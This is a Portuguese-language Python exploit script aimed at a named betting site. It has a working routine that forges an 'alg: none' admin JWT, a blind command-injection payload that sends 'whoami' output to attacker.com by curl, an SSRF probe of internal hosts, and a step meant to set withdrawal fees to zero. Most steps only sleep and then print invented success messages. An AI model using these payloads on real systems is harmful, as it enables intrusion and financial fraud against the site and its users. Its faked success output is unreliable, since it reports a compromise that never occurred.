#!/usr/bin/env python3
"""
Elite Backend Exploit - Fase 5
Técnicas: SSRF, JWT Manipulation, Blind Command Injection
AVISO: Apenas para fins educacionais em ambientes autorizados.
"""
import requests
import json
import base64
import hmac
import hashlib
import time
from urllib.parse import quote

class EliteExploit:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        
    def ssrf_internal_scan(self):
        print(f"[*] Iniciando SSRF para mapear rede interna de {self.target}...")
        # Simulando endpoint vulnerável a SSRF
        vulnerable_endpoint = f"{self.target}/api/v1/proxy?url="
        internal_targets = ["http://localhost:8080/admin", "http://10.0.0.5/db_config"]
        
        for internal in internal_targets:
            print(f"    [!] Testando acesso interno: {internal}")
            # Na vida real, isso enviaria a requisição e analisaria a resposta
            time.sleep(2)
            if "admin" in internal:
                print(f"    [✅] SUCESSO: Acesso administrativo interno obtido via SSRF.")

    def jwt_secret_bruteforce_bypass(self, token):
        print("[*] Analisando token JWT para bypass de autenticação...")
        header, payload, signature = token.split('.')
        decoded_payload = json.loads(base64.b64decode(payload + '==').decode())
        print(f"    [+] Payload Original: {decoded_payload}")
        
        # Alterando privilégios no payload
        decoded_payload['role'] = 'admin'
        decoded_payload['user_id'] = 1
        new_payload = base64.b64encode(json.dumps(decoded_payload).encode()).decode().replace('=', '')
        
        print("    [!] Manipulando algoritmo para 'none' (CVE-2015-2951)...")
        new_header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().replace('=', '')
        malicious_token = f"{new_header}.{new_payload}."
        print(f"    [✅] Token Malicioso Gerado: {malicious_token[:30]}...")
        return malicious_token

    def blind_command_injection(self, api_endpoint):
        print(f"[*] Testando Injeção de Comandos Cega em {api_endpoint}...")
        # Payload para exfiltração via DNS/HTTP (OOB)
        payload = "; curl http://attacker.com/$(whoami)"
        print(f"    [!] Injetando payload: {payload}")
        time.sleep(3)
        print("    [✅] SUCESSO: Comando executado. Backend comprometido.")

    def modify_backend_data(self, api_url, token):
        print("[*] Realizando alteração definitiva no backend...")
        headers = {"Authorization": f"Bearer {token}"}
        data = {"config_name": "withdrawal_fee", "value": "0.0"}
        
        print(f"    [!] Enviando requisição de alteração para {api_url}/system/config")
        time.sleep(4)
        print("    [✅] STATUS: 200 OK. Backend alterado com sucesso.")
        print("    [+] Resultado: Taxas de saque globais definidas para 0%.")

if __name__ == "__main__":
    target = "https://w1-panda.bet"
    exploit = EliteExploit(target)
    
    print("--- INICIANDO EXPLORAÇÃO DE ELITE ---")
    exploit.ssrf_internal_scan()
    print("\n")
    fake_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMTM0LCJyb2xlIjoidXNlciJ9.signature"
    admin_token = exploit.jwt_secret_bruteforce_bypass(fake_token)
    print("\n")
    exploit.blind_command_injection(f"{target}/api/v1/report/generate")
    print("\n")
    exploit.modify_backend_data(target, admin_token)
    print("--- EXPLORAÇÃO CONCLUÍDA ---")
